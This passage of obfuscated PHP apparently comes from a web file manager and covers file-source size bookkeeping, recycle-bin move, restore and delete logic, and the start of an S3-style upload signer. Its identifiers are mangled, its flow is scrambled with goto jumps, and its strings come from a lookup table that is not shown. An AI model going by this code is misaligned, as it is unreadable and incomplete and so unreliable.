$AŸÊ—ô¾Ç£ = $this->where(array($BÂó•¸£¥[374] => $e¡´½†–Ôµ))->find(); goto cÍÄŞ¶„¾ò; bó„Ä¹†Õ‡: } public function sourceCacheClear($E’Ç›¼Ìë¶ = false) { if ($E’Ç›¼Ìë¶ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[ºÖÙÂŒäÉê‡][414] . $E’Ç›¼Ìë¶]); } public function pathInfoByPath($b¤³¯Ã¦’, $cÛôø£ÆÍê) { $F‡‰¯é°ñ =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÈ…§¯åïñ = !$cÛôø£ÆÍê ? array() : explode($F‡‰¯é°ñ[8], trim($cÛôø£ÆÍê, $F‡‰¯é°ñ[8])); $d›„¢ˆÖœ = $b¤³¯Ã¦’; foreach ($DÈ…§¯åïñ as $céö¤ó†˜) { $FìÀªÂñŞ = array($F‡‰¯é°ñ[465] => $d›„¢ˆÖœ, $F‡‰¯é°ñ[28] => $céö¤ó†˜); $bØñÄ¶»İ = $this->where($FìÀªÂñŞ)->select(); if (!$bØñÄ¶»İ) { return !1; } $bØñÄ¶»İ = array_sort_by($bØñÄ¶»İ, $F‡‰¯é°ñ[401]); $d›„¢ˆÖœ = $bØñÄ¶»İ[0][$F‡‰¯é°ñ[374]]; } return $this->pathInfo($d›„¢ˆÖœ, !0); } protected function updateModifyTime($d§§¶àçƒ) { goto BÖÄ¤—ÒòÑ; Aô‚š±ãÇÑ: foreach ($d§§¶àçƒ as $fó²¦Ûè”À => $d©„æÒçŒ¸) { $d§§¶àçƒ[$fó²¦Ûè”À] = intval($d©„æÒçŒ¸); } $B›¬¯¹çÂ· = array($bÎ¡Ø†çñ [374] => array($bÎ¡Ø†çñ [7], $d§§¶àçƒ)); $FÒÕ‰¦äÑ = array($bÎ¡Ø†çñ [528] => USER_ID, $bÎ¡Ø†çñ [395] => time()); goto fÃÁÁŠÎƒ; BÖÄ¤—ÒòÑ: $bÎ¡Ø†çñ  =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$d§§¶àçƒ) { return; } if (!is_array($d§§¶àçƒ)) { $d§§¶àçƒ = array($d§§¶àçƒ); } goto Aô‚š±ãÇÑ; fÃÁÁŠÎƒ: $this->where($B›¬¯¹çÂ·)->save($FÒÕ‰¦äÑ); goto C¤æŞò ¢Í; C¤æŞò ¢Í: } public function folderSizeReset($e‰Ò÷¾Š‰Ñ) { goto CŠµ¼„ª‡®; CŠµ¼„ª‡®: $C³••‘Ô” =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->statusIgnoreResetSpace) { return; } $AÅêŞÓ³Â = $C³••‘Ô”[2308] . $e‰Ò÷¾Š‰Ñ; goto eÕĞğá¨å; Côéã—Ùåº: $EÆÒã”Õ¿É = array($C³••‘Ô”[373] => $e‰Ò÷¾Š‰Ñ, $C³••‘Ô”[400] => 0); $dëìÂÆ¶ä© = $this->where($EÆÒã”Õ¿É)->sum($C³••‘Ô”[77]); $dëìÂÆ¶ä© = intval($dëìÂÆ¶ä©); goto aÎ¹õÜ¯‘; a¾Š£®œò: CacheLock::unlock($AÅêŞÓ³Â); goto fİ±«éøƒˆ; aÎ¹õÜ¯‘: $BÀ‘ÎÕÁ®Ë = $dëìÂÆ¶ä© - intval($D·Ë­Ş¯Ø[$C³••‘Ô”[77]]); if ($BÀ‘ÎÕÁ®Ë == 0) { return CacheLock::unlock($AÅêŞÓ³Â); } $this->where(array($C³••‘Ô”[388] => $e‰Ò÷¾Š‰Ñ))->setField($C³••‘Ô”[77], $dëìÂÆ¶ä©); goto EŞ–Âã­È; EŞ–Âã­È: $eƒÓ•–ò¥Ş = $this->parentLevelArray($D·Ë­Ş¯Ø[$C³••‘Ô”[463]]); if ($eƒÓ•–ò¥Ş) { $EÆÒã”Õ¿É = array($C³••‘Ô”[374] => array($C³••‘Ô”[389], $eƒÓ•–ò¥Ş)); if ($BÀ‘ÎÕÁ®Ë < 0) { $EÆÒã”Õ¿É[$C³••‘Ô”[77]] = array($C³••‘Ô”[921], abs($BÀ‘ÎÕÁ®Ë)); } $this->where($EÆÒã”Õ¿É)->setAdd($C³••‘Ô”[77], $BÀ‘ÎÕÁ®Ë); } $this->targetSpaceUpdate($D·Ë­Ş¯Ø[$C³••‘Ô”[376]], $D·Ë­Ş¯Ø[$C³••‘Ô”[460]]); goto a¾Š£®œò; eÕĞğá¨å: CacheLock::lock($AÅêŞÓ³Â, 20); $this->sourceCacheClear($e‰Ò÷¾Š‰Ñ); $D·Ë­Ş¯Ø = $this->sourceInfo($e‰Ò÷¾Š‰Ñ); goto Côéã—Ùåº; fİ±«éøƒˆ: } public function folderSizeResetChildren($C‰‚øÓ‘—ò) { goto aÉÑÓÂœ³¼; A åÈêõ³·: $BÒ”­ë®‘é[] = $cÔğïè—§; $BÒ”­ë®‘é = array_to_keyvalue($BÒ”­ë®‘é, $CÎß¾Õ¦æò[374]); foreach ($BÒ”­ë®‘é as $e¼ôÅ¾å« => $c°Ü‰¯¼´‰) { $BÒ”­ë®‘é[$e¼ôÅ¾å«][$CÎß¾Õ¦æò[2310]] = $BÒ”­ë®‘é[$e¼ôÅ¾å«][$CÎß¾Õ¦æò[77]]; $BÒ”­ë®‘é[$e¼ôÅ¾å«][$CÎß¾Õ¦æò[77]] = 0; } goto BÙ¢˜ôÓ“; DŠ™¹µìª­: $B½È®¾Ñš½ = array($CÎß¾Õ¦æò[522] => 1, $CÎß¾Õ¦æò[529] => array($CÎß¾Õ¦æò[487], $cÔğïè—§[$CÎß¾Õ¦æò[463]] . $C‰‚øÓ‘—ò . $CÎß¾Õ¦æò[488])); $Eä‚ªİÏ = $CÎß¾Õ¦æò[2309]; $BÒ”­ë®‘é = $this->field($Eä‚ªİÏ)->where($B½È®¾Ñš½)->select(); goto E›Ü£¤Í„; aÉÑÓÂœ³¼: $CÎß¾Õ¦æò =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->sourceCacheClear($C‰‚øÓ‘—ò); $cÔğïè—§ = $this->sourceInfo($C‰‚øÓ‘—ò); goto DŠ™¹µìª­; e‚œŸ³Òø°: foreach ($BÒ”­ë®‘é as $c°Ü‰¯¼´‰) { if ($c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[77]] == $c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[2310]]) { continue; } $cÀ‡½¨Ë±¾[] = array($CÎß¾Õ¦æò[374], $c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[374]], $CÎß¾Õ¦æò[77], $c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[77]]); } $this->saveAll($cÀ‡½¨Ë±¾); goto C÷›ãŸ˜á; E›Ü£¤Í„: $B½È®¾Ñš½[$CÎß¾Õ¦æò[375]] = 0; $bÜ®¥Îõ‡Ã = $this->field($Eä‚ªİÏ)->where($B½È®¾Ñš½)->select(); if (!$bÜ®¥Îõ‡Ã) { return; } goto A åÈêõ³·; BÙ¢˜ôÓ“: foreach ($bÜ®¥Îõ‡Ã as $c°Ü‰¯¼´‰) { $a²¨ì×ã = $c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[465]] . $CÎß¾Õ¦æò[33]; if (!isset($BÒ”­ë®‘é[$a²¨ì×ã])) { continue; } if ($c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[401]] == $BÒ”­ë®‘é[$a²¨ì×ã][$CÎß¾Õ¦æò[401]]) { $BÒ”­ë®‘é[$a²¨ì×ã][$CÎß¾Õ¦æò[77]] += $c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[77]]; } } foreach ($BÒ”­ë®‘é as $c°Ü‰¯¼´‰) { $b¼íæâá¹Ş = $this->parentLevelArray($c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[463]]); foreach ($b¼íæâá¹Ş as $a²¨ì×ã) { $a²¨ì×ã = $a²¨ì×ã . $CÎß¾Õ¦æò[33]; if (!isset($BÒ”­ë®‘é[$a²¨ì×ã])) { continue; } if ($c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[401]] == $BÒ”­ë®‘é[$a²¨ì×ã][$CÎß¾Õ¦æò[401]]) { $BÒ”­ë®‘é[$a²¨ì×ã][$CÎß¾Õ¦æò[77]] += $c°Ü‰¯¼´‰[$CÎß¾Õ¦æò[77]]; } } } $cÀ‡½¨Ë±¾ = array(); goto e‚œŸ³Òø°; C÷›ãŸ˜á: } public function userSpaceReset($Dø¶‰”éÄº = false) { $eñèŒ¾ˆ® =& $_SERVER[ºÖÙÂŒäÉê‡]; $cµ‘éÑšÉ× = $this->where(array($eñèŒ¾ˆ®[376] => self::TYPE_USER, $eñèŒ¾ˆ®[460] => $Dø¶‰”éÄº, $eñèŒ¾ˆ®[375] => 0))->sum($eñèŒ¾ˆ®[77]); Model($eñèŒ¾ˆ®[478])->userEdit($Dø¶‰”éÄº, array($eñèŒ¾ˆ®[2052] => $cµ‘éÑšÉ×)); } public function targetSpaceUpdate($f¬­†ï¶á, $c’Ì¿†µ™‘) { $d§Şôğæƒ› =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$c’Ì¿†µ™‘) { return; } if (!in_array($f¬­†ï¶á, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $a¹¯öõŠÉŒ = $this->targetSpaceSize($f¬­†ï¶á, $c’Ì¿†µ™‘); if ($f¬­†ï¶á == self::TYPE_USER) { Model($d§Şôğæƒ›[478])->userEdit($c’Ì¿†µ™‘, array($d§Şôğæƒ›[2052] => $a¹¯öõŠÉŒ)); } else { if ($f¬­†ï¶á == self::TYPE_GROUP) { Model($d§Şôğæƒ›[462])->groupEdit($c’Ì¿†µ™‘, array($d§Şôğæƒ›[2052] => $a¹¯öõŠÉŒ)); } } } public function targetSpaceSize($bÒÇ™ÁâĞ, $fò¼“š¨ˆ) { goto C¦¡„¢ó¼ç; C¦¡„¢ó¼ç: $c´“‡»Ä‘™ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E‰‚ †ÅÈë = $this->sourceRoot($bÒÇ™ÁâĞ, $fò¼“š¨ˆ, !0); if (!$E‰‚ †ÅÈë) { return 0; } goto b´ÛÒÖ­–; DÕˆÙï»Õã: $d¹øÏ‘É™ò = array_to_keyvalue($d¹øÏ‘É™ò, $c´“‡»Ä‘™[33], $c´“‡»Ä‘™[374]); $d¹øÏ‘É™ò = array_unique(array_filter($d¹øÏ‘É™ò)); if ($d¹øÏ‘É™ò) { $CÓøéÜœá = array($c´“‡»Ä‘™[388] => array($c´“‡»Ä‘™[389], $d¹øÏ‘É™ò)); $B’åµ‘ˆµ += floatval($this->where($CÓøéÜœá)->sum($c´“‡»Ä‘™[77])); } goto DÒ—¬„½Õ; b´ÛÒÖ­–: $B’åµ‘ˆµ = floatval($E‰‚ †ÅÈë[$c´“‡»Ä‘™[77]]); $CÓøéÜœá = array($c´“‡»Ä‘™[529] => array($c´“‡»Ä‘™[487], $c´“‡»Ä‘™[474] . $E‰‚ †ÅÈë[$c´“‡»Ä‘™[374]] . $c´“‡»Ä‘™[488])); $d¹øÏ‘É™ò = Model($c´“‡»Ä‘™[399])->field($c´“‡»Ä‘™[388])->where($CÓøéÜœá)->select(); goto DÕˆÙï»Õã; DÒ—¬„½Õ: return $B’åµ‘ˆµ; goto C‡ëœì”ç¼; C‡ëœì”ç¼: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($d‚¨è‰­) { return $this->fileTypeProfile($d‚¨è‰­, SourceModel::TYPE_USER); } public function groupFileTypeProfile($CÌå´Ì‚¤˜) { return $this->fileTypeProfile($CÌå´Ì‚¤˜, SourceModel::TYPE_GROUP); } private function fileTypeProfile($AÔ•¶¹Ìºø, $Aô‘‚Œ˜”¿) { goto cÁâˆ¢·æâ; cÁâˆ¢·æâ: $E‰‚¹˜Ÿ„Ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $DœäÀğ–Œ£ = $E‰‚¹˜Ÿ„Ø[2311] . $AÔ•¶¹Ìºø . $E‰‚¹˜Ÿ„Ø[70] . $Aô‘‚Œ˜”¿; $fÇ¹Á×Ìµ = Cache::get($DœäÀğ–Œ£); goto aéÕÁ¢ãÑÒ; aéÕÁ¢ãÑÒ: if ($fÇ¹Á×Ìµ) { return $fÇ¹Á×Ìµ; } $F˜‰„—Œè = array($E‰‚¹˜Ÿ„Ø[522] => 0); if ($AÔ•¶¹Ìºø != !1) { $F˜‰„—Œè[$E‰‚¹˜Ÿ„Ø[460]] = $AÔ•¶¹Ìºø; $F˜‰„—Œè[$E‰‚¹˜Ÿ„Ø[376]] = $Aô‘‚Œ˜”¿; } goto AŸÌÒé¨; d«Ş¾²Ñ²›: foreach ($d£ÕƒÈ·İ as $Bìˆ’àŸ÷ => $F¶×ÏæõØ) { $F˜‰„—Œè[$E‰‚¹˜Ÿ„Ø[377]] = $this->fileTypeWhere($Bìˆ’àŸ÷); $EÎ§‡ò–Æî[$Bìˆ’àŸ÷] = array($E‰‚¹˜Ÿ„Ø[2313] => $F¶×ÏæõØ[$E‰‚¹˜Ÿ„Ø[28]], $E‰‚¹˜Ÿ„Ø[2314] => $this->where($F˜‰„—Œè)->count(), $E‰‚¹˜Ÿ„Ø[524] => $this->where($F˜‰„—Œè)->sum($E‰‚¹˜Ÿ„Ø[77])); } Cache::set($DœäÀğ–Œ£, $EÎ§‡ò–Æî, 1200); return $EÎ§‡ò–Æî; goto c·ÜğíÖç¹; AŸÌÒé¨: $EÎ§‡ò–Æî = array(); $EÎ§‡ò–Æî[$E‰‚¹˜Ÿ„Ø[2312]] = array($E‰‚¹˜Ÿ„Ø[2313] => LNG($E‰‚¹˜Ÿ„Ø[2312]), $E‰‚¹˜Ÿ„Ø[2314] => $this->where($F˜‰„—Œè)->count(), $E‰‚¹˜Ÿ„Ø[524] => $this->where($F˜‰„—Œè)->sum($E‰‚¹˜Ÿ„Ø[77])); $d£ÕƒÈ·İ = KodIO::fileTypeList(); goto d«Ş¾²Ñ²›; c·ÜğíÖç¹: } public function fileNameExist($b÷­ÙŒ¸, $c„Í¡‚©‚) { $bœŒ‚í“÷İ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f®ÙÙ¥½ãË = $this->childList($b÷­ÙŒ¸); foreach ($f®ÙÙ¥½ãË as $BÁ¤Ë¾‹Î) { if ($BÁ¤Ë¾‹Î[$bœŒ‚í“÷İ[28]] == $c„Í¡‚©‚) { return $BÁ¤Ë¾‹Î[$bœŒ‚í“÷İ[374]]; } } return !1; } public function childList($B„ïŸïºĞø) { goto aá³îƒ°×¬; a®¬ôøª˜¡: $D˜´‡õÆˆ“ = array($Bó©ÁâÏèÛ[465] => intval($B„ïŸïºĞø), $Bó©ÁâÏèÛ[401] => 0); $BÆŸÔ¡ª‚é = $this->where($D˜´‡õÆˆ“)->select(); $BÆŸÔ¡ª‚é = $BÆŸÔ¡ª‚é ? $BÆŸÔ¡ª‚é : array(); goto B“„îÆ¶º; B“„îÆ¶º: self::$cacheChildList[$BãÀ¦½èËß] = $BÆŸÔ¡ª‚é; foreach ($BÆŸÔ¡ª‚é as $fÃï«Ûë“) { $BãÀ¦½èËß = $Bó©ÁâÏèÛ[414] . $fÃï«Ûë“[$Bó©ÁâÏèÛ[374]]; self::$cacheSourceInfo[$BãÀ¦½èËß] = $fÃï«Ûë“; } return $BÆŸÔ¡ª‚é; goto Eœ«‘õ®“; aá³îƒ°×¬: $Bó©ÁâÏèÛ =& $_SERVER[ºÖÙÂŒäÉê‡]; $BãÀ¦½èËß = $Bó©ÁâÏèÛ[2292] . $B„ïŸïºĞø; if (isset(self::$cacheChildList[$BãÀ¦½èËß])) { return self::$cacheChildList[$BãÀ¦½èËß]; } goto a®¬ôøª˜¡; Eœ«‘õ®“: } public function fileNameAuto($c’±‰¥šç†, $aË„†Ó˜©, $CËÄ©å–²¦ = REPEAT_RENAME, $Fºî„Şé„ = false) { $DÚõ±éå‘Õ =& $_SERVER[ºÖÙÂŒäÉê‡]; $DŠ›½…í”Ñ = $this->childList($c’±‰¥šç†); $aÀ‹ï«£¦Â = array_to_keyvalue($DŠ›½…í”Ñ, $DÚõ±éå‘Õ[33], $DÚõ±éå‘Õ[28]); return $this->fileNameAutoGet($aÀ‹ï«£¦Â, $aË„†Ó˜©, $CËÄ©å–²¦, $Fºî„Şé„); } public function fileNameAutoGet($EôÈ¯×šÒ¢, $BÃïøğ‚±, $b“Şå‡¾ÅÉ, $a¸æßªŠŠè) { $fÄ…¸ä·òÂ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($b“Şå‡¾ÅÉ == REPEAT_REPLACE || !$EôÈ¯×šÒ¢ || !in_array_not_case($BÃïøğ‚±, $EôÈ¯×šÒ¢) || $a¸æßªŠŠè && $b“Şå‡¾ÅÉ != REPEAT_RENAME_FOLDER) { return $BÃïøğ‚±; } if ($b“Şå‡¾ÅÉ == REPEAT_SKIP) { return !1; } $fœÚ¦¤Ïİ = $fÄ…¸ä·òÂ[91] . get_path_ext($BÃïøğ‚±); $fœÚ¦¤Ïİ = $fœÚ¦¤Ïİ == $fÄ…¸ä·òÂ[91] || $a¸æßªŠŠè ? $fÄ…¸ä·òÂ[33] : $fœÚ¦¤Ïİ; for ($aË ŠÓ¤Ş› = 1; $aË ŠÓ¤Ş› <= count($EôÈ¯×šÒ¢) + 1; $aË ŠÓ¤Ş›++) { $có”ÅÒĞˆ = substr($BÃïøğ‚±, 0, strlen($BÃïøğ‚±) - strlen($fœÚ¦¤Ïİ)); $BŠåÎˆĞä = $có”ÅÒĞˆ . "\x28{$aË ŠÓ¤Ş›}\51{$fœÚ¦¤Ïİ}"; if (!in_array_not_case($BŠåÎˆĞä, $EôÈ¯×šÒ¢)) { return $BŠåÎˆĞä; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\143\145\x5f\162\145\143\171\143\154\145"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\x54\x69\x6d\x65", "\164\x69\155\x65", "\x69\156\163\145\162\164", "\x66\165\x6e\143\x74\151\x6f\x6e")); public function listData($cÖÁ­’‹ = false) { $FË§¸¢óœ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cÖÁ­’‹ = $cÖÁ­’‹ ? $cÖÁ­’‹ : USER_ID; $FÃ†Ø¾•©” = $this->where(array($FË§¸¢óœ[1394] => $cÖÁ­’‹))->select(); return array_to_keyvalue($FÃ†Ø¾•©”, $FË§¸¢óœ[33], $FË§¸¢óœ[374]); } public function moveToRecycle($b††ÎŞÏ©) { goto B•”Šğõª×; B·Ô¶‚•ÒÇ: $this->recycleMove($b††ÎŞÏ©, 1); if ($a¿›íëÔ[$a¹„¶›¶Ú[375]] == $a¹„¶›¶Ú[83]) { $Aµ¡ä…ó÷ = array($a¹„¶›¶Ú[529] => array($a¹„¶›¶Ú[487], $a¿›íëÔ[$a¹„¶›¶Ú[463]] . $b††ÎŞÏ© . $a¹„¶›¶Ú[488])); $dŒ¤µğ¹½¤->where($Aµ¡ä…ó÷)->setField($a¹„¶›¶Ú[401], 1); } goto E´×øç×³ ; B•”Šğõª×: $a¹„¶›¶Ú =& $_SERVER[ºÖÙÂŒäÉê‡]; $dŒ¤µğ¹½¤ = Model($a¹„¶›¶Ú[1100]); $a¿›íëÔ = $dŒ¤µğ¹½¤->sourceInfo($b††ÎŞÏ©); goto DœÑ­ªÌ¸¡; DœÑ­ªÌ¸¡: if (!$a¿›íëÔ || $a¿›íëÔ[$a¹„¶›¶Ú[401]] == $a¹„¶›¶Ú[83]) { return; } $EÄ©œÙœ´¨ = array($a¹„¶›¶Ú[388] => $b††ÎŞÏ©, $a¹„¶›¶Ú[1394] => USER_ID, $a¹„¶›¶Ú[525] => $a¿›íëÔ[$a¹„¶›¶Ú[376]], $a¹„¶›¶Ú[526] => $a¿›íëÔ[$a¹„¶›¶Ú[460]], $a¹„¶›¶Ú[529] => $a¿›íëÔ[$a¹„¶›¶Ú[463]]); $this->add($EÄ©œÙœ´¨); goto B·Ô¶‚•ÒÇ; E´×øç×³ : } public function clear() { $this->remove(!1); } public function remove($eÃ£Ö‹ìˆš = false) { goto B‰øóÁèó“; dÌâÉÛƒˆà: $eÃ£Ö‹ìˆš = $eÃ£Ö‹ìˆš === !1 ? !1 : $eÃ£Ö‹ìˆš; $c‘ƒ¸çø½ = array(); foreach ($DáôøŸ¥àğ as $Bõ °¡™îõ) { if ($eÃ£Ö‹ìˆš != !1 && !in_array($Bõ °¡™îõ, $eÃ£Ö‹ìˆš)) { continue; } $fŒ™†¹Šà->remove($Bõ °¡™îõ, !1); $c½ÂêÉ = $this->where(array($Eë¢ÃÆùŸ™[374] => $Bõ °¡™îõ))->find(); $B†Ê¯õƒì“ = $c½ÂêÉ[$Eë¢ÃÆùŸ™[376]] . $Eë¢ÃÆùŸ™[70] . $c½ÂêÉ[$Eë¢ÃÆùŸ™[460]]; $c‘ƒ¸çø½[$B†Ê¯õƒì“] = array($Eë¢ÃÆùŸ™[525] => $c½ÂêÉ[$Eë¢ÃÆùŸ™[376]], $Eë¢ÃÆùŸ™[460] => $c½ÂêÉ[$Eë¢ÃÆùŸ™[460]]); $this->where(array($Eë¢ÃÆùŸ™[374] => $Bõ °¡™îõ))->delete(); } goto CÚÜÈŸçÁ¸; B‰øóÁèó“: $Eë¢ÃÆùŸ™ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fŒ™†¹Šà = Model($Eë¢ÃÆùŸ™[1100]); $DáôøŸ¥àğ = $this->listData(); goto dÌâÉÛƒˆà; CÚÜÈŸçÁ¸: foreach ($c‘ƒ¸çø½ as $aÜĞ´·øä) { $fŒ™†¹Šà->targetSpaceUpdate($aÜĞ´·øä[$Eë¢ÃÆùŸ™[376]], $aÜĞ´·øä[$Eë¢ÃÆùŸ™[460]]); } goto B©ˆ¸ùç‡; B©ˆ¸ùç‡: } public function restore($dÌŒ¿ƒè¾ = false) { goto däÑ¼Éƒ³; Dá†±Óµà: foreach ($bòõˆ§ìÑ¶ as $dÄËÈ¢ïÍ‰) { goto F„ÄÌëÑËï; f“ƒ–š¬’Ï: if ($aÅÅÑâˆ××[$Få†ÜÄ÷š…[375]] == $Få†ÜÄ÷š…[83]) { $Eƒé·Öõ•ç = array($Få†ÜÄ÷š…[529] => array($Få†ÜÄ÷š…[487], $aÅÅÑâˆ××[$Få†ÜÄ÷š…[463]] . $dÄËÈ¢ïÍ‰ . $Få†ÜÄ÷š…[488])); $Eİó‚óÕÂƒ->where($Eƒé·Öõ•ç)->setField($Få†ÜÄ÷š…[401], 0); $this->restoreFolderChildren($dÄËÈ¢ïÍ‰, $bòõˆ§ìÑ¶); } $this->where(array($Få†ÜÄ÷š…[374] => $dÄËÈ¢ïÍ‰))->delete(); $Eİó‚óÕÂƒ->folderSizeReset($aÅÅÑâˆ××[$Få†ÜÄ÷š…[465]]); goto Fö˜œ÷ˆ¨; F„ÄÌëÑËï: if ($dÌŒ¿ƒè¾ != !1 && !in_array($dÄËÈ¢ïÍ‰, $dÌŒ¿ƒè¾)) { continue; } $aÅÅÑâˆ×× = $Eİó‚óÕÂƒ->sourceInfo($dÄËÈ¢ïÍ‰); $Cà‹Í¯ç× = $Eİó‚óÕÂƒ->sourceInfo($aÅÅÑâˆ××[$Få†ÜÄ÷š…[465]]); goto EâŒÀÓº°§; EâŒÀÓº°§: if ($Cà‹Í¯ç×[$Få†ÜÄ÷š…[401]] == $Få†ÜÄ÷š…[83]) { continue; } $Eİó‚óÕÂƒ->lockMoveStart($dÄËÈ¢ïÍ‰); $this->recycleMove($dÄËÈ¢ïÍ‰, 0); goto f“ƒ–š¬’Ï; Fö˜œ÷ˆ¨: $F¢‡š®·Şæ[] = $aÅÅÑâˆ××[$Få†ÜÄ÷š…[465]]; if ($aÅÅÑâˆ××[$Få†ÜÄ÷š…[375]] == $Få†ÜÄ÷š…[83]) { $F¢‡š®·Şæ[] = $dÄËÈ¢ïÍ‰; } $Eİó‚óÕÂƒ->lockMoveEnd($dÄËÈ¢ïÍ‰); goto dºø«¥İ÷‡; dºø«¥İ÷‡: } $Eİó‚óÕÂƒ->updateModifyTime($F¢‡š®·Şæ); goto b³‚ŠÖ¥öğ; däÑ¼Éƒ³: $Få†ÜÄ÷š… =& $_SERVER[ºÖÙÂŒäÉê‡]; $Eİó‚óÕÂƒ = Model($Få†ÜÄ÷š…[1100]); $bòõˆ§ìÑ¶ = $this->listData(); goto cµÆÀ¹ÊÊ; cµÆÀ¹ÊÊ: $dÌŒ¿ƒè¾ = $dÌŒ¿ƒè¾ == !1 ? !1 : $dÌŒ¿ƒè¾; if (!$bòõˆ§ìÑ¶) { return !0; } $F¢‡š®·Şæ = array(); goto Dá†±Óµà; b³‚ŠÖ¥öğ: } private function restoreFolderChildren($Bôëäö•³, $BÚÕÒ÷ÚÌå) { goto bÁ µšˆ‘‡; aŒ† ¥»á: $fèÒ‚”ä÷ã[$C½ñË²Ñæµ[374]][1] = array_unique($fèÒ‚”ä÷ã[$C½ñË²Ñæµ[374]][1]); $fèÒ‚”ä÷ã[$C½ñË²Ñæµ[906]] = $C½ñË²Ñæµ[2146]; $A°¸‡Õšß—->where($fèÒ‚”ä÷ã)->setField($C½ñË²Ñæµ[401], 1); goto F²Óµİ‹ˆø; A‚‰›®¥ö½: foreach ($BÚÕÒ÷ÚÌå as $DÇ°è—àÚ¨) { if ($DÇ°è—àÚ¨ == $Bôëäö•³) { continue; } if (!$A°¸‡Õšß—->isParentOf($Bôëäö•³, $DÇ°è—àÚ¨)) { continue; } $A‰‘öÍˆø = $A°¸‡Õšß—->sourceInfo($DÇ°è—àÚ¨); if ($A‰‘öÍˆø[$C½ñË²Ñæµ[375]] == $C½ñË²Ñæµ[83]) { $fèÒ‚”ä÷ã[] = array($C½ñË²Ñæµ[529] => array($C½ñË²Ñæµ[487], $A‰‘öÍˆø[$C½ñË²Ñæµ[463]] . $DÇ°è—àÚ¨ . $C½ñË²Ñæµ[488])); } else { $fèÒ‚”ä÷ã[$C½ñË²Ñæµ[374]][1][] = $DÇ°è—àÚ¨; } } if (!$fèÒ‚”ä÷ã[$C½ñË²Ñæµ[374]][1]) { unset($fèÒ‚”ä÷ã[$C½ñË²Ñæµ[374]]); } if (!$fèÒ‚”ä÷ã) { return; } goto aŒ† ¥»á; bÁ µšˆ‘‡: $C½ñË²Ñæµ =& $_SERVER[ºÖÙÂŒäÉê‡]; $A°¸‡Õšß— = Model($C½ñË²Ñæµ[1100]); $fèÒ‚”ä÷ã = array($C½ñË²Ñæµ[374] => array($C½ñË²Ñæµ[7], array())); goto A‚‰›®¥ö½; F²Óµİ‹ˆø: } private function recycleMove($EÊÇ‰äˆó‹, $b¨ˆ÷ –¯ù = 1) { $fÇ…øª‰“² =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÚœĞ†ÓÌŒ = Model($fÇ…øª‰“²[1100]); $F©ˆï©Òä³ = Model($fÇ…øª‰“²[2315]); $Aİõ»ªä§ = array($fÇ…øª‰“²[374] => $EÊÇ‰äˆó‹); if ($b¨ˆ÷ –¯ù) { $fÚœĞ†ÓÌŒ->where($Aİõ»ªä§)->setField($fÇ…øª‰“²[401], 1); $F©ˆï©Òä³->eventRecycle($EÊÇ‰äˆó‹, $fÇ…øª‰“²[2316]); } else { $a”ô‚ƒ¬ˆ„ = $fÚœĞ†ÓÌŒ->where($Aİõ»ªä§)->find(); $d­ÑŠé‡ãß = $a”ô‚ƒ¬ˆ„[$fÇ…øª‰“²[375]] == $fÇ…øª‰“²[83]; $D®µ™¼òì“ = $fÚœĞ†ÓÌŒ->fileNameAuto($a”ô‚ƒ¬ˆ„[$fÇ…øª‰“²[465]], $a”ô‚ƒ¬ˆ„[$fÇ…øª‰“²[28]], REPEAT_RENAME_FOLDER, $d­ÑŠé‡ãß); if ($D®µ™¼òì“ != $a”ô‚ƒ¬ˆ„[$fÇ…øª‰“²[28]]) { $fÚœĞ†ÓÌŒ->rename($EÊÇ‰äˆó‹, $D®µ™¼òì“); } $fÚœĞ†ÓÌŒ->where($Aİõ»ªä§)->setField($fÇ…øª‰“²[401], 0); $F©ˆï©Òä³->eventRecycle($EÊÇ‰äˆó‹, $fÇ…øª‰“²[2317]); } } } goto C§µ‰¼±êó; bŸáåâ”¡: function beforeShutdown() { Hook::trigger($_SERVER[Ş†Ÿ·Ñ«”ÔÂ][36]); } $_SERVER[$_SERVER[Ş†Ÿ·Ñ«”ÔÂ][37]] = BASIC_PATH; $_SERVER[$_SERVER[Ş†Ÿ·Ñ«”ÔÂ][38]] = LIB_DIR; goto D¸ö¢³¿ã¦; C‰Éï…Çá…: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($DŠ·ÖÁªå) { parent::__construct($DŠ·ÖÁªå); $this->signatureVersion($_SERVER[ºÖÙÂŒäÉê‡][206]); } public function uploadFormData($bÆº¿õŠ÷š, $fÊ›ùšøÑ = 3600) { goto fÄ³¿› îå; E°Åº¤Êœ: $EÅ¿ïÁ‡´· = base64_encode(json_encode($EóÜöĞŒ»)); $F«°›†Ì‰ = hash_hmac($f…Ì¥–À™…[1126], $E’•Öµ¤«æ, $f…Ì¥–À™…[1127] . $this->secret, !0); $B¡›Ñ¾×â = hash_hmac($f…Ì¥–À™…[1126], $this->region, $F«°›†Ì‰, !0); goto bš–‘ˆ•Šœ; d„•…¡ì›Ñ: $c“æôí×·´ = $f…Ì¥–À™…[59]; $e¿ÏîÂˆáŠ = gmdate($f…Ì¥–À™…[1117]); $E’•Öµ¤«æ = gmdate($f…Ì¥–À™…[687]); goto bÎøÜ”¸¿Ë; fÄ³¿› îå: $f…Ì¥–À™… =& $_SERVER[ºÖÙÂŒäÉê‡]; 